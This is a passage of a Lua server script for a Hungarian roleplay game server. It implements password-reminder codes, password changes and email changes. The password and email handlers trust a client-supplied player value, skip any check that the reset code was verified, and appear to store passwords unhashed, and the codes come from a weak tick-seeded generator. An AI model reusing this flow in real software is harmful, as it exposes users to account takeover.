                        outputChatBox(exports.oCore:getServerPrefix("red-dark", "Hiba", 3).."Hibakód: 3. Keress fel egy fejlesztőt!", player, 255, 255, 255, true)
                    end
                else
                    outputChatBox(exports.oCore:getServerPrefix("server", "Használat", 3).."/"..cmd.." [Felhasználónév] [Státusz: 0: Nem engedélyezett belépés, 1: Engedélyezett belépés]", player, 255, 255, 255, true)
                end
            else
                outputChatBox(exports.oCore:getServerPrefix("server", "Használat", 3).."/"..cmd.." [Felhasználónév] [Státusz: 0: Nem engedélyezett belépés, 1: Engedélyezett belépés]", player, 255, 255, 255, true)
            end
        else
            outputChatBox(exports.oCore:getServerPrefix("red-dark", "Flood", 3).."Ne floodolj!", player, 255, 255, 255, true)
        end
    end
end)

local allowed = {{48, 57}, {97, 122}}

local codes = {}
local codeTimers = {}
local codeSpamTimers = {}

function genCode()
    local len = 10

    --code
    math.randomseed(getTickCount())
    local str = ""
    for i = 1, len do
        local charlist = allowed[math.random(1,2)]
        str = str .. string.char(math.random(charlist[1], charlist[2]))
    end
    --

    return string.upper(str)
end

function destroyCode(e, val, ignore)
    if codes[e] then
        codes[e] = nil
        if not ignore then
            exports.oInfobox:outputInfoBox("Mivel letelt a 15 perc ezért új kódot kell igényelned!", "warning", player)
            --ez nem tudom mi, nincs client oldalon ilyen triggerClientEvent(e, "rememberMeSearch", e)
        end
    end
end
addEvent("destroyCode", true)
addEventHandler("destroyCode", root, destroyCode)

addEvent("rememberCheck",true)
addEventHandler("rememberCheck", getRootElement(), function(player,validations)
    local minutes = 15
    local lastClickTick = codeSpamTimers[player] or 0
    if lastClickTick + minutes * 60 * 1000 > getTickCount() then -- 1.5 sec
        exports.oInfobox:outputInfoBox(minutes .. " percenként küldhetsz jelszó emlékezetőt!", "warning", player)
        return
    end

    dbQuery(function(qh,player)
        local result, numAffect = dbPoll(qh, 0)
        if numAffect > 0 then
            for k,v in pairs(result) do
                --print(getPlayerSerial(player))
                if v["serial"] == getPlayerSerial(player) or v["serial"] == "*" then
                    codeSpamTimers[player] = getTickCount()
                    local code = genCode()
                    codes[player] = code
                    name = v["username"]
                    callRemote("https://originalrp.eu/forgotpw/forgot.php?username="..tostring(name).."&usermail="..tostring(validations).."&code="..code.."&verification=verification_code_here", function() end)
                    if isTimer(codeTimers[player]) then
                        killTimer(codeTimers[player])
                    end
                    codeTimers[player] = setTimer(destroyCode, minutes * 60 * 1000, 1, player, val)
                    triggerClientEvent(player, "rememberMeSelectedTab", player, 2)
                    exports.oInfobox:outputInfoBox("A kód kiküldve az emailre, ".. minutes .." perced van, amennyiben nem találod nézd meg spam mappát!", "success", player)
                else
                    exports.oInfobox:outputInfoBox("Ez a felhasználó fiók nem a te gépedhez van társítva, így nem tudsz jelszó emlékeztetőt kérni erre!", "error", player)
                end
            end
        else
            exports.oInfobox:outputInfoBox("Nincs ilyen email cím regisztrálva!", "error", player)
        end
    end,{player},con, "SELECT * FROM accounts WHERE email = ?", validations)
end)


addEvent("rememberCheck2", true)
addEventHandler("rememberCheck2", getRootElement(), function(player, code)
    if codes[player] == code then
        exports.oInfobox:outputInfoBox("Sikeresen azonosítottad magad most állíts új jelszót!", "success", player)
        triggerClientEvent(player, "rememberMeSelectedTab", player, 3)
    else
        exports.oInfobox:outputInfoBox("Hibás kód!", "error", player)
    end
end)

addEvent("passwordChange", true)
addEventHandler("passwordChange", getRootElement(), function(player, password)
    if dbExec(con, "UPDATE accounts SET password = ? WHERE serial = ?", password, getPlayerSerial(player)) then
        exports.oInfobox:outputInfoBox("Sikeresen megváltoztattad a jelszavad, most már beléphetsz!", "success", player)
    else
        exports.oInfobox:outputInfoBox("Próbáld újra! ( Error code: SQL 1 90) (LUA: @912) | Ha nem sikerül jelezd egy fejlesztőnek!","error",player)
    end
end)

addEvent("changeEmail", true)
addEventHandler("changeEmail", getRootElement(), function(player, email)
    if dbExec(con, "UPDATE accounts SET email = ?, emailForceChange = 'N' WHERE id = ?", email, getElementData(player, "user:id")) then
        exports.oInfobox:outputInfoBox("Sikeresen megváltoztattad az email címedet!", "success", player)
        setTimer(function()
            characterCheck(player, getElementData(player, "user:id"))
            triggerClientEvent(player, "closeEmailForce", player)
        end, 1000,1)

    else
        exports.oInfobox:outputInfoBox("Próbáld újra! ( Error code: SQL 1 90) (LUA: @929) | Ha nem sikerül jelezd egy fejlesztőnek!","error",player)
    end
end)


function getPlayerAccountsTable(player, id)
    return databaseAccounts[id]
end

function getPlayerCharactersTable(player, id)
    return databaseCharacters[id]
end

function setPlayerCharactersNameTable(player, id, newName)
    databaseCharacters[id]["charname"] = newName;
    triggerClientEvent(root, "recieveDatabaseDataCharacter", root, id,databaseCharacters[id])
end
